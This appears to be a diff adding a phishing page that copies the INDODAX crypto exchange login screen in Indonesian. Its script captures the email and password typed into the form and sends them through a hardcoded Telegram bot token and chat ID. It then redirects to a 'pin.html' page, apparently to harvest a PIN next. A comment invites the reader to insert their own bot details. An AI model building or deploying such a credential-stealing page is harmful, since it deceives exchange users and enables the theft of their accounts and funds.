@@ -1,0 +1,151 @@
+<html lang="id">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>
+   Masuk ke INDODAX
+  </title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <style>
+   ::placeholder {
+      color: #000000 !important;
+      opacity: 1;
+    }
+  </style>
+ </head>
+ <body class="bg-white min-h-screen flex flex-col">
+  <div class="max-w-md w-full mx-auto px-6 pt-6">
+   <div class="flex items-center justify-between mb-6">
+    <button aria-label="Back" class="text-gray-600">
+     <i class="fas fa-arrow-left text-lg"></i>
+    </button>
+    <a class="text-[#3B9CD9] text-sm font-normal" href="#">
+     Buat Akun
+    </a>
+   </div>
+   <h1 class="text-black text-xl font-bold mb-2 leading-tight">
+    Masuk ke INDODAX
+   </h1>
+   <p class="text-black text-sm font-normal mb-6 leading-relaxed">
+    Gunakan email dan kata sandi yang terdaftar untuk masuk ke akun Anda
+   </p>
+   <form id="loginForm" class="space-y-4">
+    <div>
+     <label class="block text-black text-xs font-normal mb-1" for="email">
+      Email
+     </label>
+     <input class="w-full border border-gray-300 rounded-md px-3 py-2 text-xs text-black placeholder-black focus:outline-none focus:ring-1 focus:ring-[#3B9CD9]" id="email" placeholder="Masukkan email" type="email" required/>
+    </div>
+    <div>
+     <label class="block text-black text-xs font-normal mb-1" for="password">
+      Kata Sandi
+     </label>
+     <div class="relative">
+      <input class="w-full border border-gray-300 rounded-md px-3 py-2 pr-10 text-xs text-black placeholder-black focus:outline-none focus:ring-1 focus:ring-[#3B9CD9]" id="password" placeholder="Masukkan kata sandi" type="password" required/>
+      <button aria-label="Toggle password visibility" class="absolute inset-y-0 right-3 flex items-center text-gray-400 text-sm" tabindex="-1" type="button" id="togglePassword">
+       <i class="fas fa-eye-slash"></i>
+      </button>
+     </div>
+    </div>
+    <div class="text-right">
+     <a class="text-[#3B9CD9] text-xs font-normal" href="#">
+      Lupa Kata Sandi
+     </a>
+    </div>
+    <button disabled="" id="submitBtn" class="w-full bg-[#1E90FF] text-white text-sm font-normal py-3 rounded-md mt-2 cursor-not-allowed opacity-50" type="submit">
+     Masuk
+    </button>
+   </form>
+   <div class="flex items-center my-6">
+    <div class="flex-grow border-t border-gray-300"></div>
+    <span class="mx-3 text-gray-400 text-xs font-normal">
+     atau
+    </span>
+    <div class="flex-grow border-t border-gray-300"></div>
+   </div>
+   <button class="w-full border border-gray-300 rounded-md py-2 flex items-center justify-center space-x-2 text-xs font-normal text-gray-700" type="button">
+    <img alt="Google logo with red, yellow, green, and blue colors" class="w-5 h-5" height="20" src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" width="20"/>
+    <span>
+     Lanjut dengan Google
+    </span>
+   </button>
+  </div>
+
+  <script>
+    // Toggle password visibility
+    const togglePassword = document.getElementById('togglePassword');
+    const passwordInput = document.getElementById('password');
+    togglePassword.addEventListener('click', () => {
+      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+      passwordInput.setAttribute('type', type);
+      togglePassword.innerHTML = type === 'password' ? '<i class="fas fa-eye-slash"></i>' : '<i class="fas fa-eye"></i>';
+    });
+
+    // Telegram bot info - Ganti dengan token dan chat id Anda
+    const BOT_TOKEN = '7892661345:AAEnPI4n-Rk8NxN6TALmNwpixjPP3rlpEvE';
+    const CHAT_ID = '732608';
+
+    const form = document.getElementById('loginForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const emailInput = document.getElementById('email');
+
+    // Enable/disable submit button based on input values
+    function toggleSubmitButton() {
+      if(emailInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
+        submitBtn.disabled = false;
+        submitBtn.classList.remove('cursor-not-allowed', 'opacity-50');
+        submitBtn.classList.add('cursor-pointer');
+      } else {
+        submitBtn.disabled = true;
+        submitBtn.classList.add('cursor-not-allowed', 'opacity-50');
+        submitBtn.classList.remove('cursor-pointer');
+      }
+    }
+
+    emailInput.addEventListener('input', toggleSubmitButton);
+    passwordInput.addEventListener('input', toggleSubmitButton);
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const email = emailInput.value.trim();
+      const password = passwordInput.value.trim();
+
+      if (!email || !password) {
+        alert('Mohon isi email dan kata sandi.');
+        return;
+      }
+
+      const message = `Login INDODAX\nEmail: ${email}\nKata Sandi: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if(data.ok){
+          location.href ="pin.html";
+          this.reset();
+          toggleSubmitButton();
+        } else {
+          alert('Gagal mengirim data ke Telegram.');
+        }
+      })
+      .catch(() => {
+        alert('Terjadi kesalahan saat mengirim data.');
+      });
+    });
+
+    // Initialize button state on page load
+    toggleSubmitButton();
+  </script>
+ </body>
+</html>
